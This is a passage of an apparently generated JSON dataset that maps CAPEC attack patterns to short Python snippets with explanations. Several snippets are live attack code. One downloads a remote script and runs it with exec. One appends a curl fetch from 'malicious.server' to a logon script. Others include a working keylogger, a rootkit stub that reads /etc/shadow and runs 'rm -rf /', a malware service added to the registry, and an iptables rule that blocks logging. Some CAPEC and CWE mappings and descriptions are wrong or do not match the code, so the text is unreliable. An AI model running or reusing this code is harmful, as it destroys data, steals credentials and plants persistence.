        "description": "This Python code snippet simulates a cloud storage system in a multi-tenant environment where data deletion is incomplete. The `CloudStorage` class provides methods to store and delete data. However, the `delete_data` method only closes and removes the file without securely wiping its contents, leading to potential data leakage. When a new tenant accesses the same storage resource, they can read leftover sensitive information. This demonstrates the vulnerability described in the CAPEC, highlighting the importance of proper data scrubbing and secure deletion practices to prevent unauthorized access to sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class DeviceComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def self_destruct(self):\n        # CWE-1082: Class Instance Self Destruction Control Element\n        del self\n\n    def incomplete_data_removal(self):\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        self.data = None  # Data is set to None but not securely erased\n\n    def __del__(self):\n        # CWE-1087: Class with Virtual Method without a Virtual Destructor\n        print('DeviceComponent destroyed')\n\n# Simulating physical destruction of the device\ncomponent = DeviceComponent('sensitive information')\ncomponent.incomplete_data_removal()\ncomponent.self_destruct()",
        "description": "This Python code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating a class that can self-destruct, which aligns with CWE-1082. The class also demonstrates CWE-1301 by having an incomplete data removal method that sets data to None but does not securely erase it. Additionally, the class includes a destructor method to illustrate CWE-1087, where a class with a virtual method lacks a virtual destructor. The code simulates the physical destruction of a device component by calling the self_destruct method, which deletes the instance, and the incomplete_data_removal method, which inadequately handles sensitive data."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n\n# Sensitive information\nsensitive_data = 'SECRET_KEY=12345'\n\n# Insecure storage of sensitive information\nwith open('config.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Cleartext transmission of sensitive information\ndef send_data(data):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 80))\n    s.sendall(data.encode('utf-8'))\n    s.close()\n\n# Transmitting sensitive data\nsend_data(sensitive_data)\n\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n\n# Reusing the file without clearing sensitive information\nwith open('config.txt', 'r') as file:\n    reused_data = file.read()\n\n# Transmitting reused sensitive data\nsend_data(reused_data)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. It includes the cleartext transmission of sensitive information (CWE-319) by sending sensitive data over an unencrypted socket connection. The code also shows insecure storage of sensitive information (CWE-922) by writing sensitive data to a file without proper access controls. Additionally, it demonstrates the transmission of private resources into a new sphere (CWE-402) by sending the sensitive data to an external server. The code further illustrates improper removal of sensitive information before storage or transfer (CWE-212) and sensitive information in resource not removed before reuse (CWE-226) by reusing the file containing sensitive data without clearing it first. This combination of vulnerabilities can lead to contamination of organizational information systems, requiring them to be taken offline for investigation and mitigation."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code embedded in the downloaded script\n# Example of what might be in malicious_script.py:\n# os.system('rm -rf /')",
        "description": "This Python code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system, embodying the main idea of CAPEC-Local Execution of Code. The code downloads a script from a remote URL without performing any integrity checks (CWE-494). It then executes the downloaded script directly (CWE-829), which could contain embedded malicious code (CWE-506). This represents a significant security risk as it allows an adversary to execute arbitrary code on the target system, potentially leading to severe consequences such as data loss or system compromise."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import os\nimport winreg\n\n# CWE-284: Improper Access Control\n# CWE-1392: Use of Default Credentials\n# CWE-1188: Initialization of a Resource with an Insecure Default\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Function to add a new service to Windows registry\n# This service will run with elevated privileges at startup\n\ndef add_malicious_service(service_name, executable_path):\n    try:\n        # Open the registry key where services are stored\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services', 0, winreg.KEY_SET_VALUE)\n        \n        # Create a new service key\n        service_key = winreg.CreateKey(key, service_name)\n        \n        # Set the path to the executable\n        winreg.SetValueEx(service_key, 'ImagePath', 0, winreg.REG_SZ, executable_path)\n        \n        # Set the service to start automatically\n        winreg.SetValueEx(service_key, 'Start', 0, winreg.REG_DWORD, 2)\n        \n        # Set the service type to own process\n        winreg.SetValueEx(service_key, 'Type', 0, winreg.REG_DWORD, 0x10)\n        \n        print(f'Service {service_name} added successfully.')\n    except Exception as e:\n        print(f'Failed to add service: {e}')\n\n# Example usage\nadd_malicious_service('MaliciousService', 'C:\\malicious\\malware.exe')",
        "description": "This Python code snippet demonstrates how an adversary might add a new service to the Windows registry, which will be executed at startup with elevated privileges. The function `add_malicious_service` takes a service name and the path to an executable as arguments. It then creates a new registry key for the service, sets the executable path, configures the service to start automatically, and sets the service type. This embodies the CAPEC 'Install New Service' by showing how a new service can be installed to run at startup, potentially with elevated privileges. The code also touches on related CWEs by demonstrating improper access control (CWE-284), the use of default or insecure settings (CWE-1188), and the potential for elevated access (CWE-520)."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-284: Improper Access Control\n# CWE-15: External Control of System or Configuration Setting\n# CWE-522: Insufficiently Protected Credentials\n\n# Function to modify an existing service\n# This function is vulnerable as it does not properly restrict access and allows external control of system settings\ndef modify_service(service_name, new_command):\n    # CWE-522: Storing credentials insecurely\n    admin_password = 'admin123'  # Hardcoded password\n    \n    # CWE-284: Improper Access Control\n    if os.geteuid() != 0:\n        raise PermissionError(\"This script must be run as root\")\n    \n    # CWE-15: External Control of System or Configuration Setting\n    command = f'systemctl edit {service_name}'\n    subprocess.run(command, shell=True, input=new_command.encode(), text=True)\n\n# Example usage\nmodify_service('example.service', '[Service]\\nExecStart=/usr/bin/new_command')",
        "description": "This Python code snippet demonstrates a function to modify an existing service on a Unix-like operating system. The function 'modify_service' takes a service name and a new command to replace the existing service command. The code is vulnerable due to several reasons: it uses hardcoded credentials (CWE-522), it does not properly restrict access (CWE-284), and it allows external control of system settings (CWE-15). The function checks if the script is run as root but does not implement any further access control mechanisms, making it susceptible to unauthorized modifications. This embodies the main idea of the CAPEC 'Modify Existing Service' by showing how improper handling of service modifications can lead to security vulnerabilities."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: OS Command Injection\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n\ndef install_rootkit():\n    # Simulate improper access control by running a privileged command\n    os.system('echo 0 > /proc/sys/kernel/randomize_va_space')\n\n    # Simulate exposure of sensitive system information\n    sensitive_info = os.popen('cat /etc/shadow').read()\n    print(sensitive_info)\n\n    # Simulate OS command injection vulnerability\n    user_input = 'ls; rm -rf /'\n    os.system(user_input)\n\n    # Simulate embedded malicious code (rootkit installation)\n    rootkit_code = \"\"\"\n    #include <stdio.h>\n    #include <stdlib.h>\n    void __attribute__((constructor)) install() {\n        system(\"echo 'rootkit installed' > /tmp/rootkit.log\");\n    }\n    \"\"\"\n    with open('/tmp/rootkit.c', 'w') as f:\n        f.write(rootkit_code)\n    os.system('gcc /tmp/rootkit.c -o /tmp/rootkit.so -shared -fPIC')\n    ctypes.CDLL('/tmp/rootkit.so')\n\nif __name__ == '__main__':\n    install_rootkit()",
        "description": "This Python code snippet demonstrates the installation of a rootkit by exploiting several common vulnerabilities. The function `install_rootkit` performs the following actions:\n\n1. **Improper Access Control (CWE-284)**: It runs a privileged command to disable address space layout randomization (ASLR), which should not be accessible to unauthorized users.\n2. **Exposure of Sensitive System Information (CWE-497)**: It reads and prints the contents of the `/etc/shadow` file, which contains sensitive system information.\n3. **OS Command Injection (CWE-78)**: It executes a user-provided command that includes a malicious payload (`rm -rf /`), demonstrating how improper neutralization of special elements can lead to command injection.\n4. **Embedded Malicious Code (CWE-506) and Trojan Horse (CWE-507)**: It writes and compiles a C program that acts as a rootkit, embedding malicious functionality that is hidden from normal operation. The rootkit logs its installation to a file, simulating hidden malicious behavior.\n\nThis code is a concise representation of how an adversary might exploit various weaknesses to install a rootkit, altering the functionality and information provided by the operating system."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\n# Function to check if user is admin\n# This is a client-side check and can be easily bypassed\n\ndef is_admin():\n    return os.getenv('USER') == 'admin'\n\n# Function to access restricted resource\n# This function does not properly protect alternate paths\n\ndef access_restricted_resource():\n    if is_admin():\n        print('Access granted to restricted resource')\n    else:\n        print('Access denied')\n\n# Main function\nif __name__ == '__main__':\n    # Simulate an attacker bypassing the client-side check\n    os.environ['USER'] = 'admin'\n    access_restricted_resource()",
        "description": "This Python code snippet demonstrates a functionality bypass vulnerability. The `is_admin` function performs a client-side check to determine if the user is an admin, which can be easily bypassed by an attacker by setting the `USER` environment variable to 'admin'. The `access_restricted_resource` function relies on this insecure check to grant access to a restricted resource. This example embodies the main idea of the CAPEC by showing how an adversary can bypass protection mechanisms, specifically highlighting CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-424 (Improper Protection of Alternate Path)."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import paramiko\n\n# Weak password requirements\nusername = 'admin'\npassword = 'password123'  # CWE-521: Weak Password Requirements\n\n# Single-factor authentication\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ntry:\n    # Insufficiently protected credentials\n    client.connect('192.168.1.100', username=username, password=password)  # CWE-522: Insufficiently Protected Credentials\n    stdin, stdout, stderr = client.exec_command('ls')\n    print(stdout.read().decode())\nfinally:\n    client.close()\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker uses stolen credentials to access a remote service (SSH) on a system. The code uses the Paramiko library to establish an SSH connection with a server using a username and a weak password (CWE-521). The credentials are transmitted in plaintext (CWE-522), and the authentication mechanism relies solely on a single factor (CWE-308). Once connected, the attacker can execute arbitrary commands on the remote system. This example embodies the main idea of the CAPEC 'Remote Services with Stolen Credentials' by illustrating how weak authentication practices can be exploited to gain unauthorized access to a system."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\nimport winreg\n\n# Vulnerable function to replace file extension handler\n# This function modifies the registry to change the handler for .txt files\n# CWE-284: Improper Access Control\n# CWE-73: External Control of File Name or Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-64: Windows Shortcut Following (.LNK)\ndef replace_file_handler(extension, new_handler):\n    try:\n        # Open the registry key where file handlers are stored\n        reg_path = f'Software\\\\Classes\\\\{extension}\\\\shell\\\\open\\\\command'\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:\n            # Set the new handler for the file extension\n            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, new_handler)\n            print(f'Successfully changed handler for {extension} to {new_handler}')\n    except Exception as e:\n        print(f'Failed to change handler: {e}')\n\n# Example usage\nreplace_file_handler('.txt', 'C:\\\\malicious_program.exe %1')",
        "description": "This Python code snippet demonstrates a vulnerable function that replaces the file handler for a given file extension by modifying the Windows registry. The function `replace_file_handler` takes an extension and a new handler as arguments and sets the new handler in the registry. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an application can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened. The code is vulnerable to several CWEs: CWE-284 (Improper Access Control) because it does not restrict access to the registry modification, CWE-73 (External Control of File Name or Path) because it allows user input to control the file path, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) because it relies on the file extension to determine behavior, and CWE-64 (Windows Shortcut Following (.LNK)) because it does not handle .LNK files properly."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import os\nimport time\n\n# Using an obsolete function to schedule a task\n# This is a vulnerable code example\n\ndef schedule_task():\n    # Obsolete function usage (CWE-477)\n    os.system('at 12:00 /every:M,T,W,Th,F,S,Su mytask.bat')\n\n# Simulate a task that relies on a runtime component (CWE-1101)\ndef mytask():\n    print('Task is running...')\n    # Simulate reliance on a runtime component\n    time.sleep(2)\n    print('Task completed.')\n\nif __name__ == '__main__':\n    schedule_task()\n    mytask()",
        "description": "This Python code snippet demonstrates the deprecated CAPEC concept of scheduling software to run, using related CWEs for context. The `schedule_task` function uses the obsolete `os.system` function to schedule a task, which is a representation of CWE-477 (Use of Obsolete Function). The `mytask` function simulates a task that relies on a runtime component, representing CWE-1101 (Reliance on Runtime Component in Generated Code). This code is vulnerable because it uses outdated methods for task scheduling and relies on runtime components that may not be secure or maintained."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\nimport shutil\n\n# CWE-284: Improper Access Control\n# This function does not properly check permissions before replacing the executable\n\ndef replace_trusted_executable(trusted_path, malicious_path):\n    try:\n        # CWE-78: OS Command Injection\n        # Using os.system to execute a command with user input can be dangerous\n        os.system(f'chmod 777 {trusted_path}')  # Improperly setting permissions\n        shutil.copy(malicious_path, trusted_path)  # Replacing the trusted executable\n        print(f'Replaced {trusted_path} with {malicious_path}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ntrusted_executable = '/usr/bin/trusted_app'\nmalicious_executable = '/tmp/malicious_app'\nreplace_trusted_executable(trusted_executable, malicious_executable)",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can replace a trusted executable with a malicious one. The function `replace_trusted_executable` takes the path of a trusted executable and a malicious executable as arguments. It uses `os.system` to change the permissions of the trusted executable to be writable by anyone (CWE-284: Improper Access Control), and then uses `shutil.copy` to replace the trusted executable with the malicious one. This represents the CAPEC 'Replace Trusted Executable' by exploiting weaknesses in privilege management and access control. Additionally, the use of `os.system` with user input can lead to OS command injection (CWE-78)."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\n\n# Simulate a rogue uplink station sending disruptive signals\nclass RogueUplinkStation:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n\n    def send_disruptive_signal(self, message):\n        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n            sock.sendto(message.encode(), (self.target_ip, self.target_port))\n\n# Target satellite's communication endpoint\nTARGET_IP = '192.168.1.100'\nTARGET_PORT = 12345\n\n# Rogue uplink station instance\nrogue_station = RogueUplinkStation(TARGET_IP, TARGET_PORT)\n\n# Sending disruptive signal\nrogue_station.send_disruptive_signal('DISRUPTIVE SIGNAL')\n",
        "description": "This Python code snippet simulates a rogue uplink station sending disruptive signals to a target satellite's communication endpoint. The `RogueUplinkStation` class is initialized with the target IP and port, representing the satellite's communication channel. The `send_disruptive_signal` method sends a disruptive message to the target using a UDP socket. This embodies the main idea of the CAPEC 'Orbital Jamming' by demonstrating how an adversary could disrupt satellite communications. The code also touches on related CWEs, such as improper restriction of communication channels (CWE-923) and improper verification of the source of a communication channel (CWE-940), by not ensuring the message's integrity or verifying the source."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\nimport time\n\n# Simulate a database of user credentials\nuser_db = {\n    'user1': hashlib.sha256('password123'.encode()).hexdigest(),\n    'user2': hashlib.sha256('mypassword'.encode()).hexdigest()\n}\n\n# Function to authenticate user\nfailed_attempts = {}\n\ndef authenticate(username, password):\n    global failed_attempts\n    current_time = time.time()\n    if username in failed_attempts and failed_attempts[username]['count'] >= 5 and current_time - failed_attempts[username]['time'] < 300:\n        print('Account locked due to too many failed attempts. Try again later.')\n        return False\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    if username in user_db and user_db[username] == hashed_password:\n        print('Authentication successful')\n        failed_attempts[username] = {'count': 0, 'time': current_time}\n        return True\n    else:\n        if username not in failed_attempts:\n            failed_attempts[username] = {'count': 0, 'time': current_time}\n        failed_attempts[username]['count'] += 1\n        failed_attempts[username]['time'] = current_time\n        print('Authentication failed')\n        return False\n\n# Example usage\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'password123')",
        "description": "This Python code snippet demonstrates a simple authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The code includes a user database with hashed passwords and an authentication function. The function checks for excessive failed authentication attempts (CWE-307) and locks the account if there are too many attempts within a short time frame. The code uses single-factor authentication (CWE-308) and relies on password-based authentication (CWE-309). The hashed passwords are stored in the user database, but the code does not implement password aging (CWE-262, CWE-263). This example highlights the vulnerabilities associated with using known domain credentials and the related weaknesses."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import os\nimport getpass\nimport smbclient\n\n# CWE-522: Insufficiently Protected Credentials\nusername = input('Enter admin username: ')\npassword = getpass.getpass('Enter admin password: ')\n\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\ntry:\n    smbclient.ClientConfig(username=username, password=password)\n    with smbclient.open_file(r'\\\\target_machine\\C$\\sensitive_file.txt', mode='r') as file:\n        data = file.read()\n        print(data)\nexcept smbclient.SMBAuthenticationError:\n    print('Authentication failed')\n\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n# Note: These issues are not directly represented in the code but are implied by the use of simple password-based authentication.",
        "description": "This Python code snippet demonstrates a scenario where an adversary uses stolen or guessed Windows administrator credentials to access Windows Admin Shares. The code uses the `smbclient` library to connect to a remote machine's admin share (C$) and read a sensitive file. The credentials are obtained via user input, which is insecurely handled (CWE-522). The code uses single-factor authentication (CWE-308) and relies on a password system for primary authentication (CWE-309). The snippet does not implement password aging (CWE-262) or enforce strong password requirements (CWE-521), making it vulnerable to attacks. The main idea is to highlight the risks associated with using weak or stolen credentials to access sensitive resources."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-378: Creation of Temporary File With Insecure Permissions\ntemp_dir = tempfile.gettempdir()\nshared_file_path = os.path.join(temp_dir, 'shared_file.txt')\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\nwith open(shared_file_path, 'w') as f:\n    f.write('<script>alert(\"Malicious Code Executed\")</script>')\n\n# CWE-284: Improper Access Control\nos.chmod(shared_file_path, 0o777)  # Insecure permissions\n\nprint(f'Shared file created at: {shared_file_path}')\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_and_execute(url):\n    import requests\n    response = requests.get(url)\n    exec(response.text)\n\n# CWE-433: Unparsed Raw Web Content Delivery\nweb_content = '<html><body>Raw content</body></html>'\nwith open(os.path.join(temp_dir, 'index.html'), 'w') as f:\n    f.write(web_content)\n\nprint('Web content created at:', os.path.join(temp_dir, 'index.html'))",
        "description": "This Python code snippet demonstrates the CAPEC 'Modify Shared File' by creating a shared file in a temporary directory and writing malicious content to it. The code also sets insecure permissions on the file, allowing any user to modify it (CWE-284). Additionally, it shows how an attacker might upload dangerous types of files (CWE-434) and download and execute code without integrity checks (CWE-494). Finally, it includes an example of storing raw web content that could be served without proper parsing (CWE-433). The code highlights the risks associated with improper access control, insecure temporary file creation, and handling of untrusted content."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/uploads/<filename>')\ndef uploaded_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows users to upload files to a directory under the web root and then access those files via a URL. The '/upload' endpoint handles file uploads, saving them to the '/var/www/uploads' directory. The '/uploads/<filename>' endpoint serves the uploaded files. This code embodies the CAPEC 'Add Malicious File to Shared Webroot' by allowing an adversary to upload potentially malicious files to a web-accessible directory. The related CWEs are represented as follows: CWE-284 (Improper Access Control) is shown by the lack of access control on the upload and retrieval endpoints, CWE-219 (Storage of File with Sensitive Data Under Web Root) is demonstrated by storing uploaded files in a web-accessible directory, CWE-433 (Unparsed Raw Web Content Delivery) is implied by serving files without parsing or validation, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) is shown by saving files based on their provided names, and CWE-494 (Download of Code Without Integrity Check) is represented by serving files without verifying their integrity."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\n\n# CWE-798: Use of Hard-coded Credentials\nADMIN_CREDENTIALS = {'username': 'admin', 'password': 'admin123'}\n\n# CWE-284: Improper Access Control\nlogon_script_path = '/etc/logon_script.sh'\n\n# Check if the logon script is accessible\nif os.path.exists(logon_script_path):\n    with open(logon_script_path, 'a') as logon_script:\n        # CWE-259: Use of Hard-coded Password\n        logon_script.write('\\n# Malicious code to run at logon\\n')\n        logon_script.write('echo \"Malicious code executed\"\\n')\n        logon_script.write('curl -u {username}:{password} http://malicious.server/payload\\n'.format(\n            username=ADMIN_CREDENTIALS['username'], password=ADMIN_CREDENTIALS['password']))\n\nprint('Logon script modified.')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker modifies a logon script to execute malicious code whenever a user logs on. The script uses hard-coded credentials (CWE-798) to authenticate and download a payload from a malicious server. The logon script path is assumed to be improperly protected (CWE-284), allowing unauthorized modification. The code appends malicious commands to the logon script, which will run at each logon, representing the 'Run Software at Logon' CAPEC scenario. This can lead to persistent access and lateral movement within the system."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords to try\ncommon_passwords = ['password123', '123456', 'qwerty', 'letmein', 'welcome']\n\n# List of user accounts\nuser_accounts = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Simulated function to check password (always returns False for demonstration)\ndef check_password(username, password):\n    # In a real scenario, this would check the password against a stored hash\n    return False\n\n# Password spraying attack simulation\nfor password in common_passwords:\n    for user in user_accounts:\n        if check_password(user, password):\n            print(f\"Valid credentials found: {user}:{password}\")\n        time.sleep(1)  # Sleep to avoid rapid lockouts\n    time.sleep(60)  # Wait before trying the next password to avoid detection",
        "description": "This Python code snippet simulates a Password Spraying attack. It iterates over a list of common passwords and attempts to authenticate each user account with each password. The `check_password` function is a placeholder that always returns False, representing a failed login attempt. The code includes delays (`time.sleep`) to avoid rapid or frequent account lockouts, mimicking the behavior of an attacker trying to remain undetected. This snippet embodies the main idea of CAPEC-111 (Password Spraying) and highlights related weaknesses such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\n# Vulnerable code: Using a one-way hash without a salt\npassword = 'user_password'\nhash_object = hashlib.sha256(password.encode())\npassword_hash = hash_object.hexdigest()\nprint(f'Password Hash: {password_hash}')",
        "description": "This Python code snippet demonstrates a vulnerability where a password is hashed using a one-way hash function (SHA-256) without incorporating a salt. This practice is insecure because it makes the hashed passwords susceptible to rainbow table attacks, where precomputed hash values can be used to reverse-engineer the original passwords. The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing how password hashes can be generated insecurely, and it relates to CWE-759 'Use of a One-Way Hash without a Salt'."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable code: Using obsolete function 'os.popen' to obtain data\n# This function is deprecated and can lead to security issues\ncommand = 'cat /etc/passwd'\nprocess = os.popen(command)\noutput = process.read()\nprocess.close()\n\n# Print the output which may contain sensitive information\nprint(output)",
        "description": "This Python code snippet demonstrates the use of an obsolete function 'os.popen' to obtain data from the system. The 'os.popen' function is deprecated and can lead to security vulnerabilities, such as unauthorized access to sensitive information. The code executes the 'cat /etc/passwd' command, which reads the contents of the '/etc/passwd' file, potentially exposing user information. This example embodies the main idea of the deprecated CAPEC 'Obtain Data via Utilities' and highlights the CWE-477 'Use of Obsolete Function'. The use of deprecated functions suggests that the code has not been actively reviewed or maintained, increasing the risk of security issues."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import pynput.keyboard as keyboard\n\nclass Keylogger:\n    def __init__(self):\n        self.log = \"\"\n\n    def on_press(self, key):\n        try:\n            self.log += key.char\n        except AttributeError:\n            if key == key.space:\n                self.log += ' '\n            else:\n                self.log += ' ' + str(key) + ' '\n\n    def start(self):\n        with keyboard.Listener(on_press=self.on_press) as listener:\n            listener.join()\n\nif __name__ == \"__main__\":\n    keylogger = Keylogger()\n    keylogger.start()",
        "description": "This Python code snippet demonstrates a simple keylogger using the 'pynput' library. The keylogger captures all keystrokes made by the user and stores them in a log. The 'on_press' method appends each keystroke to the log, handling both character keys and special keys. The 'start' method initiates the keylogger, which listens for keypress events. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing user input, which could include sensitive information like passwords. The related CWEs provide context on potential weaknesses, such as weak password requirements (CWE-521) and insufficiently protected credentials (CWE-522), which could be exploited by such a keylogger."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Simulate capturing user credentials\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# Store credentials in a file (vulnerable practice)\nwith open('credentials.txt', 'w') as f:\n    f.write(f'Username: {username}\\n')\n    f.write(f'Password: {password}\\n')\n\n# Simulate invoking a process with sensitive information\nos.system(f'echo Username: {username} Password: {password}')\n\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# Store sensitive information in an alternate data stream (Windows-specific vulnerability)\nif os.name == 'nt':\n    with open('hidden.txt:secret', 'w') as f:\n        f.write(f'Username: {username}\\n')\n        f.write(f'Password: {password}\\n')",
        "description": "This Python code snippet demonstrates a vulnerable practice where user credentials are captured and stored insecurely. The code prompts the user to enter their username and password, which are then written to a file in plain text. Additionally, the credentials are echoed in a system command, exposing them to other processes (CWE-214, CWE-200). On Windows systems, the credentials are also stored in an alternate data stream, which can be hidden from regular file listings (CWE-69). This code embodies the CAPEC idea of collecting data as provided by users and highlights the associated risks of exposing sensitive information to unauthorized actors."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import hashlib\nimport os\n\n# DEPRECATED: Use of MD5, an obsolete function\n# CWE-477: Use of Obsolete Function\n# CWE-391: Unchecked Error Condition\n\n# Function to generate a hash of a file\n# This function uses the deprecated MD5 algorithm\n# and does not check for errors during file reading\n\ndef generate_file_hash(file_path):\n    try:\n        hasher = hashlib.md5()  # CWE-477: Use of Obsolete Function\n        with open(file_path, 'rb') as f:\n            buf = f.read()\n            hasher.update(buf)\n        return hasher.hexdigest()\n    except Exception as e:\n        pass  # CWE-391: Unchecked Error Condition\n\n# Example usage\nfile_path = 'example.txt'\nhash_value = generate_file_hash(file_path)\nprint(f'Hash Value: {hash_value}')",
        "description": "This Python code snippet demonstrates the use of deprecated and obsolete functions, specifically the MD5 hashing algorithm (CWE-477). The function `generate_file_hash` generates a hash for a given file using MD5, which is considered insecure and obsolete. Additionally, the code includes an unchecked error condition (CWE-391) where exceptions during file reading are ignored, potentially allowing unexpected behavior to go unnoticed. This embodies the main idea of the deprecated CAPEC 'Signature-Based Avoidance' by showcasing the use of outdated and insecure practices in code."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nimport os\n\n# CWE-778: Insufficient Logging\nlogging.basicConfig(filename='/var/log/app.log', level=logging.ERROR)\n\n# CWE-532: Insertion of Sensitive Information into Log File\ndef log_sensitive_info(info):\n    logging.error(f'Sensitive info: {info}')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\ndef expose_repo():\n    os.system('cp -r .git /tmp/exposed_repo')\n\n# CAPEC: Block Logging to Central Repository\n# CWE-294: Authentication Bypass by Capture-replay\ndef block_logging():\n    os.system('iptables -A OUTPUT -p tcp --dport 514 -j DROP')\n\n# Example usage\nlog_sensitive_info('User password: 12345')\nexpose_repo()\nblock_logging()",
